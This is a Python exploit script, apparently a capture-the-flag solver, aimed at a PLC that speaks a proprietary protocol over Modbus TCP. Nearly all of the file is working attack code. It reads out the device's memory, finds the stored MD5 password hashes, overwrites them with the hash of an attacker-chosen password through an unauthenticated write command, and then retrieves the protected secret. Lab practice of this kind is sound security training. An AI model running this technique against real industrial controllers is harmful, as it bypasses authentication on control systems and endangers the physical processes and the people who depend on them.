#!/usr/bin/env python3
import struct
import hashlib
import logging
from pymodbus.client import ModbusTcpClient
from pymodbus.transaction import ModbusSocketFramer
from pymodbus.pdu import ModbusRequest, ModbusResponse

# --- CONFIGURATION ---
logging.basicConfig()
logging.getLogger().setLevel(logging.ERROR)

# --- TARGET DETAILS ---
HOST_IP = '94.237.61.242'
HOST_PORT = 51319

# --- PROTOCOL DEFINITIONS ---
CUSTOM_FUNCTION_CODE = 0x64
SESSION = 0x00

# Custom command codes within the proprietary protocol
READ_MEMORY_BLOCK = 0x20
WRITE_MEMORY_BLOCK = 0x21
GET_SECRET = 0x22

# Known error codes from the protocol documentation
ERROR_CODES = {
    0xE009: 'Authorization Error: Invalid password'
}

# --- CUSTOM PROTOCOL CLASSES ---
class CustomProtocolRequest(ModbusRequest):
    """
    Custom Modbus request class to handle the proprietary protocol.
    It encodes the session, command code, and data into a packet.
    """
    function_code = CUSTOM_FUNCTION_CODE

    def __init__(self, session=0x00, code=0, data=None, **kwargs):
        super().__init__(**kwargs)
        self.session = session
        self.code = code
        self.data = data if data is not None else []

    def encode(self):
        """Encodes the request data into a byte string."""
        data_format = '>BB' + 'B' * len(self.data)
        return struct.pack(data_format, self.session, self.code, *self.data)

class CustomProtocolResponse(ModbusResponse):
    """
    Custom Modbus response class to handle the proprietary protocol.
    It decodes the response packet from the server.
    """
    function_code = CUSTOM_FUNCTION_CODE

    def __init__(self, session=0x00, code=0x00, response_status=0x00, data=None, **kwargs):
        super().__init__(**kwargs)
        self.session = session
        self.code = code
        self.data = data if data is not None else []
        self.response_status = response_status

    def decode(self, data):
        """Decodes the response byte string into its components."""
        self.session, self.code, self.response_status = struct.unpack('>BBB', data[:3])
        self.data = list(struct.unpack('>' + 'B' * (len(data) - 3), data[3:]))

# --- HELPER FUNCTIONS ---
def send_packet(client, session, custom_code, payload=None):
    """
    Connects to the server and sends a custom protocol packet.
    Handles connection and basic error checking.
    """
    if payload is None:
        payload = []
    if not client.connect():
        print("[-] Failed to connect to the server.")
        return -1, -1, []
    
    request = CustomProtocolRequest(session=session, code=custom_code, data=payload)
    response = client.execute(request)

    if response.function_code >= 0x80:
        print(f"[!] Server returned an error for function code {response.function_code}")
        return -1, -1, []

    # Check for known protocol-level error codes
    if len(response.data) == 2:
        error_code = (response.data[0] << 8) + response.data[1]
        if error_code in ERROR_CODES:
            # We expect this error during attempts, so we don't print it here to reduce noise.
            # You can uncomment the line below for verbose debugging.
            # print(f"[-] ERROR: {ERROR_CODES[error_code]}")
            pass

    return response.code, response.response_status, response.data

def increment_address(address, increment):
    """Increments a 3-byte address list by a given value."""
    address_int = (address[0] << 16) + (address[1] << 8) + address[2]
    address_int += increment
    return [(address_int >> 16) & 0xFF, (address_int >> 8) & 0xFF, address_int & 0xFF]

def split_list_at_value(input_list, split_value):
    """Splits a list into sublists based on a delimiter value."""
    result = []
    sublist = []
    for item in input_list:
        if item == split_value:
            if sublist:
                result.append(sublist)
            sublist = []
        else:
            sublist.append(item)
    if sublist:
        # Exclude entries that are just empty memory (all 0xFF)
        if not all(x == 0xFF for x in sublist):
            result.append(sublist)
    return result

def find_sublist_index(main_list, sublist):
    """Finds the starting index of a sublist within a larger list."""
    sublist_len = len(sublist)
    for i in range(len(main_list) - sublist_len + 1):
        if main_list[i:i + sublist_len] == sublist:
            return i
    return -1

def string_to_list_of_ints(input_string):
    """Converts a string to a list of its ASCII integer values."""
    return [ord(char) for char in input_string]

def int_to_3_byte_list(value):
    """Converts an integer to a 3-byte list (big-endian)."""
    return [(value >> 16) & 0xFF, (value >> 8) & 0xFF, value & 0xFF]

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    print(f"[*] Starting solver for {HOST_IP}:{HOST_PORT}")
    client = ModbusTcpClient(HOST_IP, port=HOST_PORT, framer=ModbusSocketFramer)
    client.framer.decoder.register(CustomProtocolResponse)

    # 1. Dump the entire PLC memory
    print("[*] Dumping PLC memory (16KB)...")
    memory_block_data = []
    address = [0x00, 0x00, 0x00]
    read_length = 0xFF
    for i in range(64):  # 64 * 256 bytes = 16KB
        payload = address + [read_length]
        code, status, data = send_packet(client, SESSION, READ_MEMORY_BLOCK, payload)
        if not data or all(byte == 0xFF for byte in data):
            break # Stop if we hit empty memory
        memory_block_data.extend(data)
        address = increment_address(address, read_length)
    print(f"[*] Memory dump complete. Read {len(memory_block_data)} bytes.")

    # 2. Find all potential hash entries in the memory dump
    print("[*] Searching for potential password hash entries...")
    memory_block_entries = split_list_at_value(memory_block_data, 0x00)
    
    potential_hashes = []
    for entry in memory_block_entries:
        if len(entry) >= 16:
            index = find_sublist_index(memory_block_data, entry)
            if index != -1:
                potential_hashes.append({'index': index, 'entry': entry})
                print(f"[+] Found potential hash entry of length {len(entry)} at offset: {index}")

    if not potential_hashes:
        print("[-] Could not find any entry >= 16 bytes. Exiting.")
        exit()

    # 3. Iterate through potential hashes and attempt the exploit
    for pot_hash in potential_hashes:
        hash_entry_index = pot_hash['index']
        print(f"\n[*] --- Trying exploit with entry at offset {hash_entry_index} ---")

        # Prepare the new password and its MD5 hash
        new_password = 'new_password'
        password_list = string_to_list_of_ints(new_password)
        
        hash_object = hashlib.md5()
        hash_object.update(new_password.encode())
        hashed_value_list = list(hash_object.digest())
        
        # Attempt to overwrite the hash at different offsets and get the secret
        for offset in range(6):
            target_address_int = hash_entry_index + offset
            target_address_list = int_to_3_byte_list(target_address_int)
            
            print(f"[*]   Trying write offset {offset} (address: {target_address_int})...", end='', flush=True)
            
            # Send WRITE_MEMORY_BLOCK request
            write_payload = target_address_list + hashed_value_list
            send_packet(client, SESSION, WRITE_MEMORY_BLOCK, write_payload)
            
            # Send GET_SECRET request with the new password
            code, status, data = send_packet(client, SESSION, GET_SECRET, password_list)
            
            # Check if the response contains the flag
            if len(data) > 2:
                print(" Success!")
                print("\n[+] Found correct hash address and offset.")
                flag = "".join(chr(char) for char in data)
                print(f"\nFLAG: {flag}\n")
                exit() # Exit after finding the flag
            else:
                print(" Failed.")

    print("\n[-] Failed to retrieve the flag after trying all potential hashes and offsets.")
